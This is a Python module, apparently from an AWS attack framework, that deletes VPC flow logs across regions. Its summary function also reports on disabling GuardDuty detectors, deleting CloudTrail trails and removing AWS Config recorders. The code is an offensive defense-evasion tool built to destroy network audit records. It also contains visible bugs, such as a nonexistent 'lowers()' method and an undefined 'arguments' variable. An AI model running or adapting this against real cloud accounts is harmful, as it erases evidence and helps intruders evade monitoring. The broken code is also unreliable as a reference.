#!/usr/bin/env python3
import datetime

import argparse
from copy import deepcopy


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    
    print = awsattack_main.print
    fetch_data = awsattack_main.fetch_data
    get_regions = awsattack_main.get_regions

    vpc_regions = get_regions('ec2')

    flow_logs = []

    summary_data = {}

    if args.flow_logs is not None:
        vpc_regions = set()
        for log in args.flow_logs.split(','):
            id, region = log.split('@')
            flow_logs.append({
                'FlowLogId': id,
                'Region': region
            })
            vpc_regions.add(region)
    else:
        vpc_data = deepcopy(session.VPC)

        if 'FlowLogs' not in vpc_data:
            if fetch_data(['Logging/Monitoring Data'], technique_info['prerequisite_modules'][0], ' '.join(arguments)) is False:
                print('Pre-req module not run successfully. Only targeting services that currently have valid data...\n')
            else:
                flow_logs = deepcopy(session.VPC['FlowLogs'])
        else:
            flow_logs = vpc_data['FlowLogs']

    if len(flow_logs) > 0:
        print('Starting VPC flow logs...\n')
        summary_data['vpc'] = {
            'deleted': 0
        }
        for region in vpc_regions:
            print('  Starting region {}...\n'.format(region))

            client = awsattack_main.get_boto3_client('ec2', region)

            logs_to_delete = []
            for log in flow_logs:
                if log['Region'] == region:
                    action = args.action.lowers()
                    if action == 'y':
                        logs_to_delete.append(log['FlowLogId'])
                        print('        Added flow log {} to list of logs to delete.'.format(log['FlowLogId']))
                    else:
                        print('        Skipping flow log {}...\n'.format(log['FlowLogId']))
            # We can batch delete these and not worry about any fails, as it will do as much as it can, unlike above
            try:
                response = client.delete_flow_logs(
                    FlowLogIds=logs_to_delete
                )
                print('        Attempt to delete all flow logs succeeded. Read the output for more information on any fails:\n          {}\n'.format(response))
                summary_data['vpc']['deleted'] += len(logs_to_delete) - len(response['Unsuccessful'])
            except Exception as error:
                print('        Attempt to delete flow logs failed:\n          {}\n'.format(error))
        print('VPC flow logs finished.\n')
    else:
        print('No flow logs found. Skipping VPC...\n')

    return summary_data


def summary(data, awsattack_main):
    out = ''
    if 'guardduty' in data:
        out += '  GuardDuty:\n'
        out += '    {} detector(s) disabled.\n'.format(data['guardduty']['disabled'])
        out += '    {} detector(s) deleted.\n'.format(data['guardduty']['deleted'])
    if 'cloudtrail' in data:
        out += '  CloudTrail:\n'
        out += '    {} trail(s) disabled.\n'.format(data['cloudtrail']['disabled'])
        out += '    {} trail(s) deleted.\n'.format(data['cloudtrail']['deleted'])
        out += '    {} trail(s) minimized.\n'.format(data['cloudtrail']['minimized'])
    if 'awsconfig' in data:
        out += '  AWSConfig:\n'
        out += '    Rules:\n'
        out += '      {} rule(s) deleted.\n'.format(data['awsconfig']['rules']['deleted'])
        out += '    Recorders:\n'
        out += '      {} recorder(s) deleted.\n'.format(data['awsconfig']['recorders']['deleted'])
        out += '      {} recorder(s) stopped.\n'.format(data['awsconfig']['recorders']['stopped'])
        out += '    Aggregators:\n'
        out += '      {} aggregator(s) deleted.\n'.format(data['awsconfig']['aggregators']['deleted'])
    if 'vpc' in data:
        out += '  VPC:\n'
        out += '    {} flow log(s) deleted.\n'.format(data['vpc']['deleted'])
    
    
    return out
